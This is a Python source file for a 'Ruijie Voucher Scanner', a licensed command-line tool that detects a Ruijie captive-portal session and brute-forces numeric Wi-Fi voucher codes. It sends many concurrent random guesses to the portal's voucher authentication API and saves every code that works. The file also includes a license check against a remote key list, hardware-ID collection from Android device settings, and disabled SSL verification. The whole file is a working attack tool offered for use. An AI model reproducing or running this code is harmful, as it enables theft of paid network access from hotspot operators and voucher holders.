import os
import re
import sys
import time
import string
import random
import asyncio
import aiohttp
import requests
import threading
import hashlib
import subprocess
import json
import ssl
import urllib3
from datetime import datetime
from urllib.parse import urlparse

# --- SSL Bypass ---
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Colors ---
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ==================== LICENSE SYSTEM ====================
KEY_URL = "https://raw.githubusercontent.com/paingkhant2701199/Hacking-Attck/main/key.txt"
LICENSE_FILE = ".ruijie_v1.lic"
ID_STORAGE = ".device_id"

def get_hwid():
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"
    
    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

def save_license(hwid, key, expiry):
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def check_license():
    hwid = get_hwid()
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"{MAGENTA}{BOLD}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║     ██████╗ ██╗   ██╗██╗     ██╗███████╗                     ║")
    print("║     ██╔══██╗██║   ██║██║     ██║██╔════╝                     ║")
    print("║     ██████╔╝██║   ██║██║     ██║█████╗                       ║")
    print("║     ██╔══██╗██║   ██║██║     ██║██╔══╝                       ║")
    print("║     ██║  ██║╚██████╔╝███████╗██║███████╗                     ║")
    print("║     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚══════╝                     ║")
    print("║                                                                  ║")
    print("║              RUIJIE VOUCHER SCANNER - LICENSE SYSTEM             ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    
    # Local license check
    local_data = load_license()
    if local_data and local_data.get("id") == hwid:
        try:
            try:
                expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y %H:%M")
            except ValueError:
                expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
            
            if datetime.now() < expiry_date:
                remaining = expiry_date - datetime.now()
                days = remaining.days
                hours, rem = divmod(remaining.seconds, 3600)
                minutes, _ = divmod(rem, 60)
                
                print(f"{GREEN}{BOLD}[✓] AUTO-LOGIN SUCCESS! (Offline Mode){RESET}")
                print(f"{CYAN}[*] DEVICE ID: {hwid}{RESET}")
                print(f"{CYAN}[*] REMAINING: {days}d {hours}h {minutes}m{RESET}")
                time.sleep(1.5)
                return True
        except:
            pass
    
    # Online verification
    print(f"{YELLOW}{BOLD}[!] FIRST TIME SETUP OR LICENSE EXPIRED{RESET}\n")
    print(f"{CYAN}[*] YOUR DEVICE ID: {hwid}{RESET}\n")
    
    access_key = input(f"{WHITE}{BOLD}[>] ENTER ACCESS KEY: {RESET}").strip()
    
    if not access_key:
        print(f"{RED}[!] No key entered! Exiting...{RESET}")
        time.sleep(2)
        return False
    
    print(f"{YELLOW}[*] Verifying license online...{RESET}")
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id.strip() == hwid and db_key.strip() == access_key:
                        try:
                            try:
                                expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y %H:%M")
                            except ValueError:
                                expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                            
                            if datetime.now() < expiry_date:
                                save_license(hwid, access_key, db_date.strip())
                                print(f"{GREEN}{BOLD}[✓] ACCESS GRANTED!{RESET}")
                                print(f"{CYAN}[*] EXPIRES AT: {db_date}{RESET}")
                                time.sleep(2)
                                return True
                            else:
                                print(f"{RED}{BOLD}[!] KEY EXPIRED! PLEASE RENEW.{RESET}")
                                return False
                        except:
                            pass
        
        print(f"{RED}{BOLD}[!] INVALID KEY OR DEVICE ID NOT REGISTERED.{RESET}")
        return False
    except Exception as e:
        print(f"{RED}{BOLD}[!] DATABASE ERROR: Please check your internet.{RESET}")
        return False

# ==================== RUIJIE SCANNER (မူရင်းအတိုင်း လုံးဝ) ====================
SUCCESS_COUNT = 0
TOTAL_TRIED = 0
CURRENT_CODE = ""
START_TIME = time.time()
SAVE_PATH = "success.txt"
UL_DISPLAY = []

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] Dev_Thurs | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

class RuijieTool:
    def __init__(self):
        self.session_url = ""
        self.detected_base_url = None
        self.load_config()

    def load_config(self):
        if os.path.exists(".session_url"):
            self.session_url = open(".session_url", "r").read().strip()

    async def get_session_id(self, session):
        if not self.session_url: return None
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
        try:
            async with session.get(self.session_url, headers=headers, timeout=10) as req:
                res_url = str(req.url)
                match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res_url)
                if match:
                    return match.group(1)
        except:
            pass
        return None

    def auto_setup(self):
        try:
            res = requests.get("http://192.168.0.1", timeout=5, allow_redirects=True)
            final_url = res.url
            
            parsed = urlparse(final_url)
            self.detected_base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            portal_text = requests.get(final_url).text
            match = re.search("href='(.*?)'</script>", portal_text)
            if match:
                self.session_url = "https://portal-as.ruijienetworks.com" + match.group(1)
            else:
                self.session_url = final_url
            
            with open(".session_url", "w") as f: f.write(self.session_url)
            return True
        except:
            return False

    async def scan_logic(self, session, session_id, voucher, debug):
        global SUCCESS_COUNT, TOTAL_TRIED, CURRENT_CODE, UL_DISPLAY
        
        if self.detected_base_url:
            url = f"{self.detected_base_url}/api/auth/voucher/?lang=en_US"
        else:
            url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        
        data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        CURRENT_CODE = voucher
        
        try:
            async with session.post(url, json=data, headers=headers, timeout=15) as resp:
                TOTAL_TRIED += 1
                result = await resp.text()
                if 'logonUrl' in result or 'true' in result.lower():
                    SUCCESS_COUNT += 1
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    success_msg = f"\n{GREEN}[+] ✓ SUCCESS: {voucher} | Time: {timestamp}{RESET}"
                    print(success_msg)
                    
                    UL_DISPLAY.append(f"[{timestamp}] VALID: {voucher} | SID: {session_id}")
                    if len(UL_DISPLAY) > 50:
                        UL_DISPLAY.pop(0)
                    
                    with open(SAVE_PATH, "a") as f:
                        f.write(f"{timestamp} | {voucher} | SID: {session_id}\n")
                elif debug:
                    if 'expired' in result.lower() or 'timeout' in result.lower():
                        print(f"{YELLOW}[!] EXPIRED: {voucher}{RESET}")
                    else:
                        print(f"{RED}[-] FAILED: {voucher}{RESET}")
        except:
            pass

    def live_dashboard_ul(self, length, tasks_count, debug_mode, session_pool_size):
        """UL Style - Real-time Dashboard"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            elapsed = time.time() - START_TIME
            speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
            
            print(f"{CYAN}{BOLD}")
            print("╔══════════════════════════════════════════════════════════════════════════════════╗")
            print("║     ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗   ██╗██╗     [ Deve @Paing07709]    ║")
            print("║     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██║                           ║")
            print("║     ███████║███████║██║     █████╔╝     ██║   ██║██║                           ║")
            print("║     ██╔══██║██╔══██║██║     ██╔═██╗     ██║   ██║██║                           ║")
            print("║     ██║  ██║██║  ██║╚██████╗██║  ██╗    ╚██████╔╝███████╗                      ║")
            print("║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝                      ║")
            print("║                                                                                  ║")
            print("║              RUIJIE VOUCHER SCANNER - UNLIMITED BRUTEFORCE                       ║")
            print("╚══════════════════════════════════════════════════════════════════════════════════╝")
            print(f"{RESET}")
            print(f"{YELLOW}[{datetime.now().strftime('%H:%M:%S')}] {WHITE}▶ LIVE STATUS{RESET}")
            print(f"{GREEN}  ➜ BASE URL     : {self.detected_base_url or 'portal-as.ruijienetworks.com'}{RESET}")
            print(f"{GREEN}  ➜ VOUCHER LEN  : {length} digits{RESET}")
            print(f"{GREEN}  ➜ THREADS      : {tasks_count} async tasks{RESET}")
            print(f"{GREEN}  ➜ DEBUG MODE   : {'ON' if debug_mode else 'OFF'}{RESET}")
            print(f"{CYAN}  ➜ TOTAL TRIED  : {TOTAL_TRIED:,}{RESET}")
            print(f"{CYAN}  ➜ VALID HITS   : {SUCCESS_COUNT}{RESET}")
            print(f"{CYAN}  ➜ SPEED        : {speed:.1f} codes/sec{RESET}")
            print(f"{CYAN}  ➜ LAST CODE    : {CURRENT_CODE}{RESET}")
            
            if UL_DISPLAY:
                print(f"{MAGENTA}\n╔══════════════════════ UNLIMITED VALID HISTORY ══════════════════════╗{RESET}")
                for line in UL_DISPLAY[-10:]: 
                    print(f"{GREEN}  ➜ {line}{RESET}")
                print(f"{MAGENTA}╚════════════════════════════════════════════════════════════════════════╝{RESET}")
            
            print(f"{RED}{BOLD}\n  [PRESS CTRL+C TO STOP - ALL RESULTS SAVED TO success.txt]{RESET}")
            time.sleep(0.8)

    async def start_immortal(self):
        global START_TIME, TOTAL_TRIED, SUCCESS_COUNT, UL_DISPLAY
        
        TOTAL_TRIED = 0
        SUCCESS_COUNT = 0
        UL_DISPLAY = []
        START_TIME = time.time()
        
        if not self.session_url:
            print(f"{YELLOW}[*] Session id getting waiting...{RESET}")
            if not self.auto_setup():
                print(f"{RED}[!] Setup Error {RESET}")
                time.sleep(2)
                return
            print(f"{GREEN}[+] Auto Setup Good {RESET}")
            time.sleep(1)
        
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{GREEN}{BOLD}[+] Starting Ruijie Scanner...{RESET}")
        time.sleep(1)
        
        try:
            length = int(input(f"{WHITE}[?] Voucher Length (Default 6): {GREEN}") or 6)
            tasks_count = int(input(f"{WHITE}[?] Threads/Speed (Default 50): {GREEN}") or 50)
            debug_mode = input(f"{WHITE}[?] Show Failed/Debug? (y/n): {GREEN}").lower() == 'y'
        except ValueError:
            print(f"{RED}[!] Invalid input{RESET}")
            return
        
        dashboard_thread = threading.Thread(target=self.live_dashboard_ul, args=(length, tasks_count, debug_mode, 30), daemon=True)
        dashboard_thread.start()
        
        async with aiohttp.ClientSession() as session:
            loop_idx = 0
            while True:
                if loop_idx % 40 == 0:
                    sid = await self.get_session_id(session)
                
                if not sid:
                    await asyncio.sleep(3)
                    continue
                
                tasks = []
                for _ in range(tasks_count):
                    v = ''.join(random.choices(string.digits, k=length))
                    tasks.append(self.scan_logic(session, sid, v, debug_mode))
                
                await asyncio.gather(*tasks)
                loop_idx += 1

# ==================== MAIN ====================
def main():
    if not check_license():
        print(f"{RED}{BOLD}[!] ACCESS DENIED! Exiting...{RESET}")
        time.sleep(2)
        sys.exit(1)
    
    tool = RuijieTool()
    try:
        asyncio.run(tool.start_immortal())
    except KeyboardInterrupt:
        elapsed = time.time() - START_TIME
        print(f"\n{RED}{BOLD}[!] Scanner stopped by user{RESET}")
        print(f"{YELLOW}[✓] Valid codes saved to: {SAVE_PATH}{RESET}")
        print(f"{CYAN}[✓] Total Tried: {TOTAL_TRIED:,} | Valid: {SUCCESS_COUNT} | Time: {elapsed:.1f}s{RESET}")
        
        if UL_DISPLAY:
            print(f"{GREEN}\n[✓] All Valid Codes Found:{RESET}")
            for line in UL_DISPLAY:
                print(f"  {GREEN}➜ {line}{RESET}")
        sys.exit()

if __name__ == "__main__":
    main()
